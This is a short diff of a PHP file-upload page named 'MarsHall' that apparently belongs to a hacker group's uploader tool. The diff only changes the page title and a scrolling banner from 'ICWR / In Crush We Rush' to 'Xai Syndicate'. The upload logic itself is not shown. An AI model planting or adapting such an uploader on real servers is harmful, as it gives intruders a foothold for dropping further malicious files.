@@ -2,7 +2,7 @@ http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
 <html xmlns="http://www.w3.org/1999/xhtml">
 <head>
 <meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
-<title>MarsHall - ICWR</title>
+<title>MarsHall - Xai Syndicate</title>
 </head>
 <body bgcolor="white">
 <?php
@@ -14,7 +14,7 @@ align=center><font size=5 color=#ff0000>uploaded successfully</font></body>';
 } else { print '<body
 
 bgcolor=#000></br></br><div align=center><font size=5 color=#ff0000Error !
-</font> <marquee> MarsHall - In Crush We Rush </marquee> </body>'; }
+</font> <marquee> MarsHall - Xai Syndicate </marquee> </body>'; }
 ?>
 <div style=" color:#F00;text-align:center; margin-top:60px; font-size:25px;
 ">&gt;&gt;  &nbsp;  Upload Your file </div>
